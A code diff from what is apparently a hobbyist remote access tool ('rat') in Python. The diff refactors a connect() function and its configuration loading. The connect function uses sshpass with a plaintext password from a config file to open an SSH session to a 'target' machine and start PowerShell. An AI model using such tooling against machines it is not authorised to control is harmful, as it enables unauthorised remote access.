@@ -68,21 +68,19 @@ def os_detection():
         return "L"
     
 #connect rat to target
-def connect():
+def connect(address, password):
 
-    configuration = read_config(sys.argv[1])
 
-    #get config info
-    ipv4 = configuration.get("IPADDRESS")
-    target_password = configuration.get("PASSWORD")
-    working_dir = configuration.get("WORKINGDIRECTORY")
 
-    print(repr(target_password))
-    print(repr(ipv4))
+   
     #REMOTLY CORRECT
-    os.system(f"sshpass -p \"{target_password}\" ssh rat@{ipv4} 'powershell'")
+    os.system(f"sshpass -p \"{password}\" ssh rat@{address} 'powershell'")
     #target = SSHClient()
     #target.connect(ipv4, username='rat', password=target_password)
+
+#terminate programe
+def exit():
+    sys.exit()
 
 #Command Line interface
 def cli(arguments):
@@ -93,9 +91,19 @@ def cli(arguments):
     if arguments:
         print(options_menu)
         option = input(f"{header}")
+        try:
+            configuration = read_config(sys.argv[1])
+        except FileNotFoundError:
+            print("[!!] File Does Not Exsist")
+            exit()
+        
+        #get config info
+        ipv4 = configuration.get("IPADDRESS")
+        target_password = configuration.get("PASSWORD")
+        working_dir = configuration.get("WORKINGDIRECTORY")
 
         if option == "0":
-            connect()
+            connect(ipv4, target_password)
     # If arguments dont exsist
     else:
         print(help_menu)
